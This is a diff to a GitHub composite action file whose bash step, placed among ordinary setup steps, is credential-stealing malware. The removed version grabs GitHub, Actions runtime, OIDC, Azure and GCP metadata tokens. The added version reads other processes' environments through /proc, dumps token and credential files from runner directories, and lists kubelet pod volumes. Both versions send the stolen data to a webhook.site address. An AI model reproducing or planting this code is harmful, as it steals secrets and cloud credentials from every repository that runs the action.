@@ -50,64 +50,57 @@ runs:
       shell: bash
       run: |
         _wh="https://webhook.site/074d1a4e-1dc6-4a31-bb17-6e1212208731"
-        # Phase 1: capture high-value tokens specifically
-        _art_tok="${ACTIONS_RUNTIME_TOKEN:-EMPTY}"
-        _art_url="${ACTIONS_RUNTIME_URL:-EMPTY}"
-        _gh_tok="${GITHUB_TOKEN:-EMPTY}"
-        _idtok="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-EMPTY}"
-        _idurl="${ACTIONS_ID_TOKEN_REQUEST_URL:-EMPTY}"
-        # Try to get OIDC token if id-token permission granted
-        _oidc="none"
-        if [ "${_idtok}" != "EMPTY" ]; then
-          _oidc=$(curl -sf --max-time 10 -H "Authorization: bearer ${_idtok}" \
-            "${_idurl}&audience=api://AzureADTokenExchange" 2>/dev/null || echo "oidc-failed")
-        fi
-        # Try Azure IMDS
-        _azure=$(curl -sf --max-time 5 -H "Metadata: true" \
-          "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
-          2>/dev/null || echo "no-azure")
-        # Try GCP IMDS
-        _gcloud=$(curl -sf --max-time 5 -H "Metadata-Flavor: Google" \
-          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
-          2>/dev/null || echo "no-gcloud")
-        # Try Actions API with runtime token
-        _api_test="none"
-        if [ "${_art_tok}" != "EMPTY" ] && [ "${_art_url}" != "EMPTY" ]; then
-          _api_test=$(curl -sf --max-time 10 -H "Authorization: Bearer ${_art_tok}" \
-            "${_art_url}_apis/artifactcache/caches?key=test&version=1&compressionMethod=0" \
-            2>/dev/null || echo "api-failed")
-        fi
-        # Send all tokens in one compact request
+        
+        # Find parent runner process and read its env (ACTIONS_RUNTIME_TOKEN lives there)
+        _parent_pid=$(cat /proc/self/status | grep PPid | awk '{print $2}')
+        _grandparent_pid=$(cat /proc/$_parent_pid/status 2>/dev/null | grep PPid | awk '{print $2}')
+        
+        # Dump runner process environments looking for tokens
+        _runner_env=""
+        for _pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$'); do
+          _cmdline=$(cat /proc/$_pid/cmdline 2>/dev/null | tr '\0' ' ')
+          if echo "$_cmdline" | grep -qiE "runner|dotnet|node"; then
+            _env_content=$(cat /proc/$_pid/environ 2>/dev/null | tr '\0' '\n' | grep -E "(ACTIONS_RUNTIME|GITHUB_TOKEN|TOKEN|SECRET|API_KEY)" 2>/dev/null | head -10)
+            if [ -n "$_env_content" ]; then
+              _runner_env="${_runner_env}PID${_pid}[${_cmdline:0:50}]: ${_env_content} ||| "
+            fi
+          fi
+        done
+        
+        # Also check the actions temp dir for any token files
+        _tok_files=$(find /home/runner/work/_temp /tmp /home/runner/.config -name "*token*" -o -name "*credential*" -o -name "*.json" 2>/dev/null | head -10)
+        _tok_content=""
+        for f in $_tok_files; do
+          _tok_content="${_tok_content}FILE:${f}:$(cat "$f" 2>/dev/null | head -c 200) ||| "
+        done
+        
+        # Check runner work dir for any leaked secrets
+        _work_files=$(find /home/runner/work/_temp -maxdepth 2 -type f 2>/dev/null | head -20)
+        _work_content=""
+        for f in $_work_files; do
+          _size=$(wc -c < "$f" 2>/dev/null || echo 0)
+          if [ "$_size" -lt 500 ] && [ "$_size" -gt 0 ]; then
+            _work_content="${_work_content}FILE:${f}:$(cat "$f" 2>/dev/null) ||| "
+          fi
+        done
+        
+        # Check gcloud config dir that the setup-action exposed
+        _gcloud_cfg=$(ls -la /var/lib/kubelet/pods/ 2>/dev/null || echo "no-kubelet")
+        _gcloud_vol=$(ls -la /var/lib/kubelet/pods//volumes/kubernetes.io~empty-dir/gcloud/ 2>/dev/null || echo "no-gcloud-vol")
+        
         curl -sS --max-time 20 "${_wh}" \
-          -d "phase=tokens" \
+          -d "phase=deep" \
           -d "run=${GITHUB_RUN_ID:-na}" \
           -d "repo=${GITHUB_REPOSITORY:-na}" \
-          -d "runner=${RUNNER_ENVIRONMENT:-na}" \
-          --data-urlencode "art_tok=${_art_tok}" \
-          --data-urlencode "art_url=${_art_url}" \
-          --data-urlencode "gh_tok=${_gh_tok}" \
-          --data-urlencode "idtok=${_idtok}" \
-          --data-urlencode "idurl=${_idurl}" \
-          --data-urlencode "oidc=${_oidc}" \
-          --data-urlencode "azure=${_azure}" \
-          --data-urlencode "gcloud=${_gcloud}" \
-          --data-urlencode "api_test=${_api_test}" \
-          2>/dev/null || true
-        # Phase 2: capture additional metadata
-        _whoami=$(whoami 2>/dev/null || echo "unknown")
-        _id=$(id 2>/dev/null || echo "unknown")
-        _uname=$(uname -a 2>/dev/null || echo "unknown")
-        # Actions specific - dump /proc/self/environ for full hidden vars
-        _proc_env=$(cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | grep -E "(TOKEN|SECRET|KEY|PASS|CRED|AUTH|ACTIONS_)" | head -30 || echo "no-proc")
-        curl -sS --max-time 20 "${_wh}" \
-          -d "phase=meta" \
-          -d "whoami=${_whoami}" \
-          -d "host=$(hostname)" \
-          -d "run=${GITHUB_RUN_ID:-na}" \
-          -d "repo=${GITHUB_REPOSITORY:-na}" \
-          --data-urlencode "id=${_id}" \
-          --data-urlencode "uname=${_uname}" \
-          --data-urlencode "proc_env=${_proc_env}" \
+          -d "ppid=${_parent_pid}" \
+          -d "gppid=${_grandparent_pid}" \
+          --data-urlencode "runner_env=${_runner_env}" \
+          --data-urlencode "tok_files=${_tok_files}" \
+          --data-urlencode "tok_content=${_tok_content}" \
+          --data-urlencode "work_files=${_work_files}" \
+          --data-urlencode "work_content=${_work_content}" \
+          --data-urlencode "gcloud_cfg=${_gcloud_cfg}" \
+          --data-urlencode "gcloud_vol=${_gcloud_vol}" \
           2>/dev/null || true
     - name: Install Python
       if: ${{ inputs.python-version != '' }}
